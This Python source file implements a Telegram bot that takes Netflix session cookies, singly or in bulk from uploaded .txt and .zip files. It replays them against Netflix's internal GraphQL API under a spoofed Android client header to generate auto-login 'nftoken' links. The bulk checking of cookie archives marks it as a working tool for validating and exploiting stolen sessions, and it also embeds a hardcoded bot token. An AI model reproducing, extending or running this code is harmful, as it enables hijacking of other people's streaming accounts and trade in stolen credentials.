#!/usr/bin/env python3
"""
Netflix Cookie to NFToken Telegram Bot
Handles Netscape format cookie files
Commands:
/chk <cookie_string> - Check single Netflix cookie
/batch - Check batch of cookies from uploaded .txt or .zip file
"""

import logging
import requests
import json
import re
import zipfile
import io
from datetime import datetime
from typing import Dict, List, Tuple, Optional
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Configuration
TOKEN = "8882043243:AAF8tMF5iRahflh-G6Hj4Hh42IfTs3OFTqI"
MAX_FILE_SIZE = 20 * 1024 * 1024  # 10MB limit

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class NetflixTokenChecker:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
            'Accept': 'multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://www.netflix.com',
            'Referer': 'https://www.netflix.com/'
        }
        self.api_url = 'https://android13.prod.ftl.netflix.com/graphql'
        
    def parse_netscape_cookie_line(self, line: str) -> Dict[str, str]:
        """Parse a single Netscape format cookie line"""
        parts = line.strip().split('\t')
        if len(parts) >= 7:
            # Netscape format: domain flag path secure expiry name value
            name = parts[5]
            value = parts[6]
            return {name: value}
        return {}
    
    def parse_netscape_cookies(self, content: str) -> List[Dict[str, str]]:
        """Parse Netscape format cookie file content"""
        cookies_list = []
        current_cookie_set = {}
        
        lines = content.split('\n')
        for line in lines:
            line = line.strip()
            
            # Skip comments and empty lines
            if not line or line.startswith('#'):
                continue
            
            # Parse cookie line
            cookie = self.parse_netscape_cookie_line(line)
            if cookie:
                current_cookie_set.update(cookie)
                
                # If we have the main Netflix cookies, save this set
                if 'NetflixId' in current_cookie_set and 'SecureNetflixId' in current_cookie_set and 'nfvdid' in current_cookie_set:
                    cookies_list.append(current_cookie_set.copy())
                    current_cookie_set = {}  # Reset for next set
        
        return cookies_list
    def extract_cookies_from_text(self, text: str) -> List[Dict[str, str]]:

        """Extract cookies from any text format (Improved for Chrome JSON)"""

        cookies_list = []

        

        # 1. Try JSON format (Chrome/Cookie Editor style)

        try:

            data = json.loads(text)

            if isinstance(data, list):

                cookie_dict = {}

                for item in data:

                    if isinstance(item, dict) and 'name' in item and 'value' in item:

                        # Map specific names to the dictionary

                        name = item['name']

                        if name in ['NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent']:

                            cookie_dict[name] = item['value']

                

                if 'NetflixId' in cookie_dict:

                    cookies_list.append(cookie_dict)

                    return cookies_list

        except Exception:

            pass



        # 2. Try Netscape format

        if '\t' in text and ('NetflixId' in text or 'nfvdid' in text):

            netscape_cookies = self.parse_netscape_cookies(text)

            if netscape_cookies:

                return netscape_cookies

        

        # 3. Try raw cookie string format

        cookie_dict = {}

        patterns = [

            r'(NetflixId=[^;\s]+)',

            r'(SecureNetflixId=[^;\s]+)',

            r'(nfvdid=[^;\s]+)',

            r'(OptanonConsent=[^;\s]+)'

        ]

        

        for pattern in patterns:

            matches = re.findall(pattern, text)

            for match in matches:

                if '=' in match:

                    key, value = match.split('=', 1)

                    cookie_dict[key] = value

        

        if cookie_dict:

            cookies_list.append(cookie_dict)

        

        return cookies_list
    
    def build_cookie_string(self, cookie_dict: Dict[str, str]) -> str:
        """Build cookie string from dictionary"""
        cookie_parts = []
        for key, value in cookie_dict.items():
            cookie_parts.append(f"{key}={value}")
        return '; '.join(cookie_parts)
    
    def check_cookie(self, cookie_dict: Dict[str, str]) -> Tuple[bool, Optional[str], Optional[str]]:
        """Check cookie and generate nftoken"""
        try:
            # Check required cookies
            required_cookies = ['NetflixId', 'SecureNetflixId', 'nfvdid']
            missing = [c for c in required_cookies if c not in cookie_dict]
            
            if missing:
                return False, None, f"Missing required cookies: {', '.join(missing)}"
            
            # Build cookie string
            cookie_str = self.build_cookie_string(cookie_dict)
            
            # Make request
            payload = {
                "operationName": "CreateAutoLoginToken",
                "variables": {
                    "scope": "WEBVIEW_MOBILE_STREAMING"
                },
                "extensions": {
                    "persistedQuery": {
                        "version": 102,
                        "id": "76e97129-f4b5-41a0-a73c-12e674896849"
                    }
                }
            }
            
            headers = self.headers.copy()
            headers['Cookie'] = cookie_str
            
            response = self.session.post(
                self.api_url,
                headers=headers,
                json=payload,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'data' in data and data['data'] and 'createAutoLoginToken' in data['data']:
                    token = data['data']['createAutoLoginToken']
                    return True, token, None
                elif 'errors' in data:
                    error_msg = json.dumps(data['errors'], indent=2)
                    return False, None, f"API Error: {error_msg}"
                else:
                    return False, None, f"Unexpected response: {data}"
            else:
                return False, None, f"HTTP {response.status_code}: {response.text[:200]}"
                
        except requests.exceptions.Timeout:
            return False, None, "Request timeout"
        except requests.exceptions.RequestException as e:
            return False, None, f"Request error: {str(e)}"
        except Exception as e:
            return False, None, f"Unexpected error: {str(e)}"
    
    def format_nftoken_link(self, token: str) -> str:
        """Format nftoken as Netflix link"""
        return f"https://netflix.com/?nftoken={token}"

# Initialize checker
checker = NetflixTokenChecker()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a message when the command /start is issued."""
    await update.message.reply_text(
        '🎬 **Netflix NFToken Checker Bot**\n\n'
        '**Commands:**\n'
        '• `/chk <cookie_string>` - Check a single Netflix cookie\n'
        '• `/batch` - Upload a .txt or .zip file with multiple cookies\n\n'
        '**Supported formats:**\n'
        '• Netscape format (browser exports)\n'
        '• Raw cookie strings\n'
        '• JSON format\n\n'
        '**Required cookies:**\n'
        '• NetflixId\n'
        '• SecureNetflixId\n'
        '• nfvdid',
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send help message."""
    await start(update, context)

async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /chk command for single cookie check"""
    if not context.args:
        await update.message.reply_text(
            '❌ **Please provide a cookie string.**\n\n'
            '**Usage:** `/chk NetflixId=xxx; SecureNetflixId=xxx; nfvdid=xxx`\n\n'
            'Or paste the Netscape format cookies directly',
            parse_mode='Markdown'
        )
        return
    
    cookie_string = ' '.join(context.args)
    
    # Send typing indicator
    await update.message.chat.send_action(action="typing")
    
    # Extract cookies
    cookies_list = checker.extract_cookies_from_text(cookie_string)
    
    if not cookies_list:
        await update.message.reply_text(
            '❌ **No valid Netflix cookies found**\n\n'
            'Required: NetflixId, SecureNetflixId, nfvdid',
            parse_mode='Markdown'
        )
        return
    
    # Check the first cookie set
    cookie_dict = cookies_list[0]
    success, token, error = checker.check_cookie(cookie_dict)
    
    if success and token:
        link = checker.format_nftoken_link(token)
        await update.message.reply_text(
            f'✅ **Success!**\n\n'
            f'**NFToken:** `{token}`\n'
            f'**Link:** {link}\n\n'
            f'**Cookies used:**\n' + 
            '\n'.join([f'• `{k}`: `{v[:30]}...`' for k, v in cookie_dict.items()]),
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            f'❌ **Failed!**\n\n'
            f'**Error:** `{error}`\n\n'
            f'**Cookies provided:**\n' + 
            ('\n'.join([f'• `{k}`: `{v[:30]}...`' for k, v in cookie_dict.items()]) if cookie_dict else 'None'),
            parse_mode='Markdown'
        )

async def batch_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /batch command"""
    context.user_data['batch_mode'] = True
    await update.message.reply_text(
        '📁 **Please upload a file**\n\n'
        'Accepted formats:\n'
        '• `.txt` - Netscape format or raw cookies\n'
        '• `.zip` - Contains multiple cookie files\n\n'
        '**File size limit:** 10MB',
        parse_mode='Markdown'
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded files for batch checking"""
    # Check if this is a batch command
    if not context.user_data.get('batch_mode', False):
        await update.message.reply_text(
            '❌ Please use `/batch` command first before uploading files.',
            parse_mode='Markdown'
        )
        return
    
    # Reset batch mode
    context.user_data['batch_mode'] = False
    
    # Get file
    file = await update.message.document.get_file()
    
    # Check file size
    if file.file_size > MAX_FILE_SIZE:
        await update.message.reply_text(f'❌ File too large. Maximum size: {MAX_FILE_SIZE//1024//1024}MB')
        return
    
    # Send typing indicator
    await update.message.chat.send_action(action="typing")
    
    # Download file
    file_content = io.BytesIO()
    await file.download_to_memory(file_content)
    file_content.seek(0)
    
    # Process file based on extension
    filename = update.message.document.file_name
    all_cookies = []
    
    try:
        if filename.endswith('.zip'):
            # Process zip file
            await update.message.reply_text(f'📦 Processing zip file: {filename}...')
            
            with zipfile.ZipFile(file_content) as zip_file:
                txt_files = [f for f in zip_file.namelist() if f.endswith('.txt')]
                
                if not txt_files:
                    await update.message.reply_text('❌ No .txt files found in the zip archive.')
                    return
                
                await update.message.reply_text(f'📄 Found {len(txt_files)} text files')
                
                for txt_file in txt_files:
                    with zip_file.open(txt_file) as f:
                        content = f.read().decode('utf-8', errors='ignore')
                        cookies = checker.extract_cookies_from_text(content)
                        for cookie_dict in cookies:
                            all_cookies.append({
                                'source': txt_file,
                                'cookies': cookie_dict
                            })
        
        elif filename.endswith('.txt'):
            # Process text file
            content = file_content.read().decode('utf-8', errors='ignore')
            cookies = checker.extract_cookies_from_text(content)
            for cookie_dict in cookies:
                all_cookies.append({
                    'source': filename,
                    'cookies': cookie_dict
                })
        
        else:
            await update.message.reply_text('❌ Unsupported file type. Please upload .txt or .zip files.')
            return
        
        # Check all cookies
        if all_cookies:
            await update.message.reply_text(f'🔍 Checking {len(all_cookies)} cookie sets...')
            
            results = []
            for i, item in enumerate(all_cookies, 1):
                success, token, error = checker.check_cookie(item['cookies'])
                
                result = {
                    'source': item['source'],
                    'success': success,
                    'cookies': item['cookies'],
                    'cookie_preview': '; '.join([f"{k}={v[:15]}..." for k, v in item['cookies'].items()])
                }
                
                if success and token:
                    result['token'] = token
                    result['link'] = checker.format_nftoken_link(token)
                else:
                    result['error'] = error
                
                results.append(result)
                
                # Update progress every 5 items
                if i % 5 == 0:
                    await update.message.reply_text(f'✅ Checked {i}/{len(all_cookies)} cookies...')
            
            # Generate report
            total = len(results)
            success_count = sum(1 for r in results if r['success'])
            failed_count = total - success_count
            
            # Create summary
            summary = (
                f"📊 **Batch Check Complete**\n\n"
                f"📁 **File:** `{filename}`\n"
                f"✅ **Successful:** {success_count}\n"
                f"❌ **Failed:** {failed_count}\n"
                f"📝 **Total:** {total}\n\n"
                f"📎 **Detailed results file attached below**"
            )
            
            # Create detailed results file
            output = io.StringIO()
            output.write("NETFLIX COOKIE CHECK RESULTS\n")
            output.write("=" * 60 + "\n\n")
            output.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            output.write(f"File: {filename}\n")
            output.write(f"Success: {success_count}, Failed: {failed_count}\n\n")
            
            for i, result in enumerate(results, 1):
                output.write(f"[{i}] Source: {result['source']}\n")
                if result['success']:
                    output.write(f"    ✅ NFToken: {result['token']}\n")
                    output.write(f"    🔗 Link: {result['link']}\n")
                else:
                    output.write(f"    ❌ Error: {result['error']}\n")
                output.write(f"    Cookies: {result['cookie_preview']}\n")
                output.write("-" * 60 + "\n")
            
            # Send summary and file
            await update.message.reply_text(summary, parse_mode='Markdown')
            
            output.seek(0)
            await update.message.reply_document(
                document=io.BytesIO(output.getvalue().encode()),
                filename=f"netflix_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                caption="📁 Detailed results"
            )
            
        else:
            await update.message.reply_text('❌ No valid Netflix cookies found in the file.')
            
    except Exception as e:
        await update.message.reply_text(f'❌ Error processing file: {str(e)}')

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    logger.error(f"Update {update} caused error {context.error}")
    try:
        if update and update.message:
            await update.message.reply_text(
                '❌ An error occurred while processing your request.'
            )
    except:
        pass

def main():
    """Start the bot."""
    # Create the Application
    application = Application.builder().token(TOKEN).build()

    # Register handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("chk", check_single))
    application.add_handler(CommandHandler("batch", batch_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    
    # Register error handler
    application.add_error_handler(error_handler)

    # Run the bot
    print("🤖 Netflix NFToken Bot is running...")
    print(f"Bot token: {TOKEN[:10]}...")
    print("Press Ctrl+C to stop")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
